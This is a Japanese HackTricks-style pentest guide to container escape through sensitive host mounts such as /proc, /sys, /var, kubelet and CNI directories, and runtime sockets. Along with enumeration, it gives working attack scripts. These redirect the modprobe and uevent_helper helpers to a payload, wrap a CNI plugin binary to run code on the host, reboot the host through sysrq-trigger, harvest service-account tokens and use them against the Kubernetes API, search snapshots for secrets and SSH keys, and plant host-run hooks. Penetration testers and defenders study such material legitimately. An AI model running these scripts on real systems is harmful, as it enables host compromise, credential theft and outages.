# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概要

ホストマウントは、慎重に隔離されたプロセスの視界をホストリソースへ直接アクセスできる状態に戻してしまうことが多いため、実践的なコンテナエスケープの攻撃対象面として特に重要です。危険なケースは `/` に限りません。`/proc`、`/sys`、`/var`、ランタイムソケット、kubelet が管理する状態、デバイス関連パスの bind mount によって、カーネル制御機能、認証情報、隣接コンテナのファイルシステム、ランタイム管理インターフェースが露出する可能性があります。

このページが個別の保護策に関するページとは別に設けられているのは、悪用モデルが複数の領域にまたがるためです。書き込み可能なホストマウントが危険なのは、mount namespace、user namespace、AppArmor や SELinux の適用範囲、そして公開された正確なホストパスがそれぞれ関係するからです。独立したトピックとして扱うことで、攻撃対象面をより簡単に把握できます。

また、ホスト上の書き込み可能なディレクトリと、各コンテナ内の対応するパスを比較してください。実行可能な起動スクリプトが置かれたディレクトリにマウントされている場合、権限の低いホストユーザーがコードを仕込み、次回の再起動時に、より高い権限を持つコンテナの entrypoint に読み込ませられる可能性があります。正確な bind mount のソースと宛先、ディレクトリの書き込み／検索権限、entrypoint のループと実行可能ファイルの要件、ランタイム UID、実際の再起動トリガーを確認してください。コンテナ内の UID 0 が自動的にホストの UID 0 になるわけではありません。ホストへの影響は、user namespace のマッピングと mount policy によって決まります。受動的な調査では、スクリプトを書き込んだりワークロードを再起動したりせず、パスと権限を報告してください。

Linux コンテナは、一部の Windows ホストファイルシステムを共有する管理 VM 内で動作している場合があります。[VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) はホストのファイルをゲストから見えるようにする方法の一つですが、その VM の root は Windows 管理者とは別の ID です。共有領域からユーザーの SSH 秘密鍵を読み取れる場合は、認証情報に関する手がかりとして扱ってください。ホスト側にある正確なマウント、鍵の所有権とアクセス権、対応するアカウント、Windows SSH サーバーで**実際に有効な** authorized-key policy を確認してから、ホストへのログインが可能だと結論付けてください。最新の [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) では、管理者アカウントに別個の `administrators_authorized_keys` ファイルを使用するのが一般的です。通常の列挙結果に秘密鍵の内容を含めないでください。受動的なトリアージには、マウントと鍵パスのメタデータで十分です。

## `/proc` の露出

procfs には、一般的なプロセス情報だけでなく、影響の大きいカーネル制御インターフェースも含まれています。そのため、`-v /proc:/host/proc` のような bind mount や、予期せず書き込み可能な proc エントリを公開するコンテナのビューによって、情報漏えい、サービス拒否、ホスト上での直接的なコード実行につながる可能性があります。

価値の高い procfs パスには、次のものがあります。

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (特に `register` と `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 悪用

まず、価値の高い procfs エントリのうち、どれが見えるか、または書き込み可能かを確認します。

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

これらのパスは、それぞれ異なる理由で注目に値します。書き込み可能な場合、`core_pattern`、`modprobe`、`binfmt_misc` はホスト上でコード実行につながる可能性があります。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、カーネルの exploit に関する強力な偵察情報源です。`sched_debug` と `mountinfo` は、プロセス、cgroup、ファイルシステムのコンテキストを明らかにし、コンテナ内からホストの構成を再構築する助けになります。

各パスの実用上の価値は異なります。すべてを同じ影響度として扱うと、トリアージが難しくなります。

- `/proc/sys/kernel/core_pattern`
  書き込み可能な場合、これは影響度が特に高い procfs パスの1つです。クラッシュ後にカーネルがパイプハンドラーを実行するためです。コンテナから、overlay 内またはマウントされたホストパス上にある payload を `core_pattern` に指定できれば、多くの場合、ホスト上でコード実行を取得できます。専用の例については [read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
  このパスは、カーネルがモジュール読み込み処理を呼び出す必要があるときに使う userspace helper を制御します。コンテナから書き込み可能で、ホストのコンテキストで解釈される場合、ホスト上でコードを実行する別のプリミティブになり得ます。特に、helper の実行をトリガーする手段と組み合わせると注目に値します。
- `/proc/sys/vm/panic_on_oom`
  通常、これは直接的な脱出プリミティブではありませんが、OOM 状態をカーネル panic に変えることで、メモリ圧迫をホスト全体の denial of service に変える可能性があります。
- `/proc/sys/fs/binfmt_misc`
  登録インターフェースが書き込み可能な場合、攻撃者は任意の magic value に対するハンドラーを登録し、一致するファイルが実行されたときにホストのコンテキストでコードを実行できる可能性があります。
- `/proc/config.gz`
  カーネル exploit のトリアージに役立ちます。ホストのパッケージメタデータがなくても、どのサブシステム、緩和策、オプションのカーネル機能が有効かを判断できます。
- `/proc/sysrq-trigger`
  主に denial of service につながるパスですが、非常に深刻です。ホストを即座に再起動、panic、またはその他の方法で妨害できます。
- `/proc/kmsg`
  カーネルリングバッファのメッセージを明らかにします。ホストのフィンガープリンティングやクラッシュ解析に役立ち、一部の環境ではカーネル exploit に有用な情報の leak にもつながります。
- `/proc/kallsyms`
  読み取り可能な場合は価値があります。export されたカーネルシンボル情報が露出し、カーネル exploit の開発時にアドレスランダム化の前提を崩す助けになる可能性があります。
- `/proc/[pid]/mem`
  これはプロセスメモリへの直接インターフェースです。必要な ptrace 相当の条件を満たして対象プロセスにアクセスできる場合、別のプロセスのメモリを読み取ったり変更したりできる可能性があります。現実的な影響は、認証情報、`hidepid`、Yama、ptrace の制限に大きく左右されるため、強力ですが条件付きのパスです。
- `/proc/kcore`
  システムメモリをコアイメージ形式で参照できます。ファイルは巨大で扱いにくいものの、実際に読み取り可能であれば、ホストのメモリ領域が不適切に露出していることを示します。
- `/dev/kmem` と `/dev/mem`
  これらは歴史的に影響度の高い、生メモリ向けの **device** インターフェースであり、procfs ファイルではありません。最新のシステムでは存在しないか、厳しく制限されていることが多いものの、ホストからマウントされたコピーをコンテナが開ける場合は、重大な露出として扱ってください。存在しない `/proc/kmem` や `/proc/mem` のパスを探すのではなく、他の機密性の高い `/dev` マウントと併せて確認してください。
- `/proc/sched_debug`
  スケジューリング情報とタスク情報を leak し、他のプロセスビューが予想以上にクリーンに見える場合でも、ホストプロセスの識別情報が露出する可能性があります。
- `/proc/[pid]/mountinfo`
  コンテナがホスト上のどこに実際に存在するか、どのパスが overlay を基盤としているか、書き込み可能なマウントがホストのコンテンツに対応するのか、コンテナレイヤーだけに対応するのかを再構築するのに非常に役立ちます。

`/proc/[pid]/mountinfo` または overlay の詳細が読み取り可能な場合は、それらを使ってコンテナのファイルシステムのホストパスを特定してください:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

これらのコマンドは、host-execution の手法の多くで、container 内のパスを host 側から見た対応するパスに変換する必要があるため便利です。

### 例: `modprobe` ヘルパーパスの準備

`/proc/sys/kernel/modprobe` が container から書き込み可能で、ヘルパーパスが host のコンテキストで解釈される場合、攻撃者が制御する payload にリダイレクトできます。overlay の upper ディレクトリは host 側から解決できる必要があります。また、container が host の `/tmp` もマウントしていない場合、proof の出力は同じ host から見える container レイヤーに書き戻す必要があります。

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

対象やkernelの挙動によって正確なトリガーは異なるため、意図的に推測していません。labを離れる前に、元の値に戻してください。重要なのは、書き込み可能なhelper pathによって、将来のkernel helper呼び出しを攻撃者が制御するホストパス上のコンテンツへリダイレクトできる点です。overlayの`upperdir`がない、ホストが解決できないパスである、sysctl mountが読み取り専用である、またはkernelが選択したhelperを呼び出さない場合、この連鎖は断たれます。

### 完全な例: `kallsyms`、`kmsg`、`config.gz`を使ったkernel偵察

目的が即時の脱出ではなく、悪用可能性の評価である場合:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

これらのコマンドを使うと、有用なシンボル情報が見えるか、最近のカーネルメッセージから興味深い状態がわかるか、どのカーネル機能や緩和策が組み込まれているかを確認できます。通常、直接エスケープにつながるわけではありませんが、カーネル脆弱性のトリアージにかかる時間を大幅に短縮できます。

### 完全な例: SysRq によるホストの再起動

`/proc/sysrq-trigger` が書き込み可能で、ホスト側のビューに到達する場合:

```bash
echo b > /proc/sysrq-trigger
```

影響は即座にホストの再起動として現れます。これは微妙な例ではありませんが、procfs の露出が単なる情報開示よりはるかに深刻な事態につながり得ることを明確に示しています。

## `/sys` Exposure

sysfs は大量のカーネルおよびデバイスの状態を公開します。sysfs のパスの中には、主にフィンガープリント取得に役立つものもあれば、ヘルパーの実行、デバイスの動作、セキュリティモジュールの設定、ファームウェアの状態に影響を与えるものもあります。

重要度の高い sysfs パスには、以下があります。

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要である理由はそれぞれ異なります。`/sys/class/thermal` は熱管理の動作に影響を与え、露出の設定が不適切な環境ではホストの安定性を損なう可能性があります。`/sys/kernel/vmcoreinfo` はクラッシュダンプやカーネルレイアウトに関する情報を leak する可能性があり、低レベルのホストフィンガープリント取得に役立ちます。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` インターフェースであるため、予期しないアクセスによって MAC 関連の状態が公開または変更される可能性があります。EFI 変数のパスはファームウェアに保存されたブート設定に影響を与える可能性があり、通常の設定ファイルよりはるかに深刻です。`/sys/kernel/debug` 以下の `debugfs` は、開発者向けに設計されたインターフェースであり、本番環境向けに強化されたカーネル API よりも安全性への期待がはるかに低いため、特に危険です。

この一覧にある sysfs エントリーはすべて、**カーネル、設定、ハードウェアに依存します**。現在の仮想化ノードでは、`uevent_helper`、EFI 変数、thermal-device エントリーがまったく存在しないこともよくあります。別のカーネルの例が当てはまると決めつけず、パスが存在しない場合は前提条件が満たされていないこととして記録してください。

これらのパスを確認する際に役立つコマンドは次のとおりです。

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

これらのコマンドが注目に値する理由:

- `/sys/kernel/security` から、AppArmor、SELinux、または別の LSM サーフェスが、本来ホスト内だけにとどまるべき形で見えているかどうかが分かる場合があります。
- `/sys/kernel/debug` は、このグループで最も警戒すべき項目となることがよくあります。`debugfs` がマウントされ、読み取りまたは書き込みが可能な場合、カーネルに直接関わる広範なサーフェスが存在すると考えてください。具体的なリスクは、有効になっているデバッグノードによって異なります。
- EFI 変数の露出は一般的ではありませんが、通常のランタイムファイルではなくファームウェアに基づく設定に関わるため、存在する場合は影響が大きくなります。
- `/sys/class/thermal` は、シェル経由の分かりやすい脱出というより、ホストの安定性やハードウェアとのやり取りに関係します。
- `/sys/kernel/vmcoreinfo` は、主にホストのフィンガープリンティングやクラッシュ解析に利用でき、カーネルの低レベルな状態を把握するのに役立ちます。

### 完全な例: `uevent_helper`

`/sys/kernel/uevent_helper` はカーネルや設定に依存し、現在のシステムの多くでは存在しません。存在し、書き込み可能で、利用可能な `uevent` トリガーがある場合、カーネルが攻撃者の制御下にあるヘルパーを実行する可能性があります。証明用の出力には、ホストとコンテナの両方のビューから見えるパスを使用する必要があります:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

これが機能するのは、helper path がホストの視点から解釈されるためです。トリガーされると、helper は現在のコンテナ内ではなく、ホストのコンテキストで実行されます。`/sys/class/mem/null/uevent` は、このファイルを公開しているカーネルで使える具体的なトリガーの1つです。他のデバイスが独自の `uevent` ファイルを公開している場合もありますが、実機で確認せずに選ばないでください。ラボを終了する前に、元の値に戻してください。helper ファイルまたは制御可能なトリガーが存在しない場合、この手法が利用可能だと報告しないでください。

## `/var` の公開

ホストの `/var` をコンテナにマウントしても、`/` のマウントほど劇的には見えないため、影響が過小評価されがちです。実際には、runtime socket、コンテナの snapshot directory、kubelet が管理する pod volume、projected service-account token、隣接するアプリケーションの filesystem にアクセスできる場合があります。最近のノードでは、運用上もっとも興味深いコンテナの状態が実際に `/var` に保存されていることがよくあります。

### Kubernetes の例

`hostPath: /var` を指定した pod は、他の pod の projected token や overlay snapshot の内容を読み取れる場合があります：

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

これらのコマンドは、mount が重要度の低いアプリケーションデータだけを公開しているのか、それとも影響の大きいクラスター認証情報も公開しているのかを判断するのに役立ちます。読み取り可能な service-account token があれば、ローカルコード実行から即座に Kubernetes API へのアクセスにつながる可能性があります。

token が存在する場合は、発見しただけで終わらせず、アクセス可能な範囲を確認してください:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

ここでの影響は、ローカルノードへのアクセスをはるかに超える可能性があります。広範なRBAC権限を持つトークンがあれば、マウントされた`/var`を通じてクラスター全体が侵害される可能性があります。

### Dockerとcontainerdの例

Dockerホストでは、関連データは多くの場合`/var/lib/docker`の下にあります。一方、containerdを使用するKubernetesノードでは、`/var/lib/containerd`またはsnapshotter固有のパスの下にある場合があります：

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

マウントされた `/var` から別の workload の書き込み可能な snapshot の内容にアクセスできる場合、攻撃者は現在のコンテナ設定に触れることなく、アプリケーションファイルを改変したり、Web コンテンツを仕込んだり、起動スクリプトを変更したりできる可能性があります。

**使い捨ての lab workload** では、書き込み可能な snapshot の内容を使って、アプリケーションの改ざん、secret の復旧、またはラテラルムーブメントを実証できます。まず runtime container ID を正確な snapshot に対応付け、無関係な snapshot や本番環境の snapshot は決して編集しないでください：

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

これらのコマンドが役立つのは、マウントされた `/var` がもたらす主な影響を、アプリケーションの改ざん、secret の回収、隣接するワークロードへのラテラルムーブメントという3つのカテゴリで示しているためです。

スナップショットへの直接書き込みは、runtime の通常の状態管理を迂回し、コンテナを破損させたり証拠を消去したりする可能性があります。読み取り専用の調査は、Docker の `overlay2` に対してローカルで再現されました。隣接する使い捨てコンテナに書き込んだマーカーが、`/var/lib/docker/overlay2/<id>/diff/` 配下に現れました。実際のスナップショット変更は、そのテスト用に作成した使い捨てコンテナに限定してください。

## Kubelet の状態、プラグイン、CNI のパス

`/var/lib/kubelet`、`/opt/cni/bin`、または `/etc/cni/net.d` のマウントは、特権 DaemonSet、CNI エージェント、CSI node plugin、GPU operator、ストレージヘルパーを通じて公開されていることがよくあります。これらのマウントは「ノードの配線」にすぎないと軽視されがちですが、新しい Pod の実行経路に直結しており、kubelet の認証情報、projected secret、登録用 socket、ホスト側で実行される plugin のバイナリが含まれていることもよくあります。

価値の高いターゲットには、次のものがあります。

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

確認に役立つコマンドは次のとおりです。

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

これらのパスが重要な理由:

- `/var/lib/kubelet/pki` から kubelet クライアント証明書やその他のノードローカル認証情報が漏れる可能性があります。クラスタの設計によっては、それらを API server や kubelet 向けの TLS エンドポイントに対して再利用できる場合があります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` には、同じノード上の隣接する pod 用にマウントされた service-account token や Secrets が含まれていることがよくあります。
- `/var/lib/kubelet/pod-resources/kubelet.sock` は主に reconnaissance の対象ですが、非常に有用です。現在どの pod やコンテナが GPU、hugepages、SR-IOV デバイス、その他の希少なノードローカルリソースを使用しているかがわかります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins`、`/var/lib/kubelet/plugins_registry` から、インストールされている CSI、DRA、device plugin と、kubelet が接続する想定のソケットがわかります。これらのディレクトリが読み取り専用ではなく書き込み可能な場合、問題はさらに深刻になります。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` と `/etc/cni/net.d` は、pod のネットワーク設定処理に直接関わります。ここへの書き込み可能なアクセスは、単なる設定情報の露出ではなく、時間差でホスト上でコードを実行する手段になることがよくあります。<sup>[[2]](#references)</sup>

### 完全な例: 書き込み可能な `/opt/cni/bin`

ホストの CNI バイナリディレクトリが読み書き可能でマウントされている場合、plugin を置き換えるだけで、次に kubelet がそのノード上で pod sandbox を作成したときにホスト上でコードを実行できる可能性があります。<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

これはマウントされた `docker.sock` ほど即座に利用できるものではありませんが、侵害された Kubernetes インフラストラクチャ Pod では、より現実的なケースがよくあります。マーカーはマウントされたプラグインの隣に書き込まれるため、コンテナはホストの root やホストの `/tmp` をマウントしていなくても取得できます。ラッパーは元の引数と標準入力を維持し、その後、例では元のバイナリを復元します。重要なのは、改変されたバイナリが現在のコンテナではなく、後にホストのネットワーク設定フローによって実行される点です。無効なラッパーは、新しい Pod サンドボックスへのネットワーク付与を妨げる可能性があるため、使い捨てのノードのみを使用してください。

## ランタイムソケット

ホスト上の機密性の高いマウントには、ディレクトリ全体ではなく、ランタイムソケットが含まれていることがよくあります。これらは非常に重要なので、ここで改めて明示します:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

これらのソケットのいずれかがマウントされた後の完全なexploit flowについては、[runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)を参照してください。

最初の簡単なやり取りのパターンとしては、

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

これらのいずれかが成功した場合、「mount された socket」から「より高い権限を持つ sibling container を起動する」までの道のりは、通常、kernel breakout の経路よりもはるかに短くなります。

同じ daemon アクセスを使って、**host persistence** を確立することもできます。書き込み可能な host-root bind mount を持つ helper container は、`docker cp` でファイルを受け取り、その後 `docker exec` で mount された host path の下に SSH key、service unit、その他の persistence file を配置できます。セキュリティ境界となるのは、host mount を作成する daemon の権限です。`docker cp` はファイルを配置するための準備にすぎません。runtime socket が公開された後は、新たに作成された container と、host の認証関連 path または起動関連 path への書き込みの両方を監査してください。

## Writable Host Path Task Hijack

書き込み可能な host mount は、危険になるために `/` を公開する必要はありません。mount された path に、スクリプト、config file、hook、plugin、または後で host 側の scheduled task や service によって読み込まれるファイルが含まれていれば、container は host が実行する内容を変更できる可能性があります。

一般的な確認フロー:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

書き込み可能なファイルがホストプロセスによって読み込まれる場合、テスト中はpayloadをシンプルにし、動作を確認できるようにします。

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

興味深い点は信頼境界です。書き込みはコンテナ内部から行われますが、実行は後にホストサービスのコンテキストで行われます。これにより、限定的な hostPath や bind mount が、遅延型のホストコード実行プリミティブになります。

## 共有ホストパス上の root 所有ファイル

root になれるコンテナアカウントは、ホストも使用する書き込み可能なパスに、root 所有のファイルを配置できる場合があります。コンテナの UID 0 がホストの UID 0 にマップされ、両方のビューが同じファイルを参照し、ホストの mount が SUID 実行を許可している場合、そのパス上にある root 所有の SUID 実行ファイルを実行できるホストユーザーは、ホストの権限境界を越えられる可能性があります。このファイル所有権の問題が発生するために、コンテナを `--privileged` で実行する必要はありません。別途必要となる条件については、[user namespace mappings](protections/namespaces/user-namespace.md) と [SUID の説明](privileged-containers.md)を参照してください。

**両側から**パスを確認してください。無害なファイルの所有権と ID を比較し、コンテナの `uid_map` と `gid_map` を確認して、ホストの mount オプションと実行ポリシーを調べます。コンテナ側で `rw` が設定されていても `nosuid` がないことは、調査候補にすぎません。それだけでは、ホスト上の所有権、ホストの mount フラグ、ホストユーザーのアクセス権、または AppArmor/SELinux が実行をブロックするかどうかは判断できません。`noexec` は、それが適用されるビューでの実行を制限します。`/proc/self/mountinfo` 内の `shared:` と `master:` タグが示すのは mount propagation であり、ファイルの内容がホストと共有されているかどうかではありません。bind mount にこれらのタグがない場合もあります。ホストへのログインを可能にする認証情報の再利用は、共有ファイルによる権限境界とは別の段階です。

ホストの runtime storage によって、明示的な bind mount がなくても同様のパスが生じることがあります。[CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) により、非特権のホストユーザーが Docker のデータサブディレクトリをたどり、コンテナの filesystem 内のファイルを実行できました。Moby は 20.10.9 で権限を修正し、ディレクトリを修正するには実行中のコンテナを再起動する必要があると説明しています。正確な `overlay2/<id>/merged` の mount パスと各親ディレクトリの検索権限を確認し、コンテナの UID 0 がホストの UID 0 にマップされているか、実際の root 所有 SetUID 実行ファイルが存在してアクセス可能か、ホスト側のビューで SetUID 実行が許可されているかを確認します。Rootless または user-namespace-remapped コンテナ、`nosuid`、`noexec`、`no_new_privs`、MAC ポリシーによって結果が変わることがあります。runtime のバージョンやパスをたどれることだけでは、ホストの root として実行できる証明にはならず、調査の手掛かりにすぎません。候補の実行ファイルを実行せずに、mount とファイルのメタデータを調べてください。

## Mount 関連の CVE

ホスト mount は runtime の脆弱性にも関係します。近年の重要な例を以下に示します。

- `runc` の `CVE-2024-21626`。leak したディレクトリのファイルディスクリプターにより、作業ディレクトリをホストの filesystem 上に配置できる可能性がありました。
- BuildKit の `CVE-2024-23651`、`CVE-2024-23652`、`CVE-2024-23653`。悪意のある Dockerfile、frontend、`RUN --mount` の処理により、build 中にホストファイルへのアクセス、削除、または昇格した権限が再び可能になるおそれがありました。
- Buildah と Podman の build 処理における `CVE-2024-1753`。細工された build 中の bind mount により、`/` が read-write で公開される可能性がありました。
- `containerd` 2.1.0 の `CVE-2025-47290`。image の unpack 中に発生する TOCTOU により、特別に細工された image が pull 中にホストの filesystem を変更できる可能性がありました。

これらの CVE がここで重要なのは、mount の扱いが operator の設定だけの問題ではないことを示しているためです。runtime 自体が、mount を介した escape の条件を生み出すこともあります。

## 確認方法

以下のコマンドを使うと、リスクの高い mount 露出をすばやく特定できます。

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

ここで興味深い点:

- Host root、`/proc`、`/sys`、`/var`、runtime socket は、いずれも優先度の高い発見事項です。
- 書き込み可能な proc/sys エントリは、多くの場合、その mount が安全なコンテナビューではなく、ホスト全体に影響するカーネル制御を公開していることを意味します。
- mount された `/var` のパスは、ファイルシステムの確認だけでなく、認証情報や隣接するワークロードも調査する必要があります。
- Kubelet の状態ディレクトリと CNI/plugin のパスは、runtime socket と同等の優先度で調査する必要があります。これらは多くの場合、ノード上の pod 作成や認証情報配布の経路に直接位置しているためです。

## ローカルでの検証状況

このページの実践的な攻撃チェーンは、ローカルの Linux minikube node で検証しました。検証では、次の内容を再現しました。

- 一時的に書き込み可能な hostPath 経由での読み取りと書き込み
- `/var/lib/kubelet/pods` 経由での、投影された ServiceAccount token と mount された Secret の発見
- mount された kubelet 状態から回収した有効な token による、Kubernetes API 認証の成功
- mount された `/var` 経由での、隣接する Docker `overlay2` filesystem の読み取り専用での発見
- mount された `docker.sock` 経由での、読み取り専用のホスト bind を持つ兄弟コンテナの Docker API による作成
- 一時的なホスト側で実行される hook を使った、遅延ホスト実行
- 元の plugin の引数、標準入力、実行を維持する CNI-wrapper のシミュレーション

同じ node では `core_pattern`、`modprobe`、`binfmt_misc/register`、`kallsyms`、`kcore`、`config.gz` が公開されていましたが、`uevent_helper`、EFI variables、thermal entries、`sched_debug` は公開されていませんでした。破壊的なカーネルトリガーは実行していません。この結果から、host-root、`/var`、kubelet-state、socket、ホスト側で処理される hook の攻撃チェーンは再現可能である一方、procfs/sysfs の helper を使う手法は、正確な kernel、mount mode、payload path、trigger に応じて条件付きで扱う必要があることが確認できました。

## References

- [1] [Kubelet が使用するローカルファイルとパス](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent コンテナが `hostPath` mount 経由でホストにアクセスできる](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
